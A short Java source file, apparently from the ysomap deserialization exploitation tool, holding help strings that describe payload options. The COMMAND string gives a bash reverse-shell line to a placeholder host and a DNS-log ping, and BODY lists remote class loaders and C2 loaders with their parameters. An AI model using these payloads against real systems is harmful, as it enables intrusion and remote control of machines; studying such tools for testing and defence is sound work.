package ysomap.core.util;

/**
 * @author wh1t3p1g
 * @since 2021/12/13
 */
public class DetailHelper {

    public final static String COMMAND =
            "execute system command.<br>" +
            "1. dns: ping -nc 1 {dnslog}<br>" +
            "2. reverse shell: /bin/bash -i >& /dev/tcp/x.x.x.x/port 0>&1<br>" +
            "3. if not work, try to encode the command. https://jackson-t.ca/runtime-exec-payloads.html<br>";

    public final static String BODY =
            "根据effect类型填充body内容，分别如下：<br>" +
            "1. default, body=command<br>" +
            "2. TomcatEcho, body不填<br>" +
            "3. SocketEcho, body=host;port<br>" +
            "4. RemoteFileLoader 或 RemoteFileHttpLoader, body=url;classname<br>" +
            "5. RemoteFileHttpExecutor, body=url;os<br>" +
            "6. DnslogLoader, body=dnslog<br>" +
            "7. WinC2Loader, body=local filepath<br>" +
            "8. MSFJavaC2Loader, body=url<br>" +
            "9. CustomizableClassLoader, body=local class filepath<br>" +
            "10. SpecialRuntimeExecutor, body=command";

}
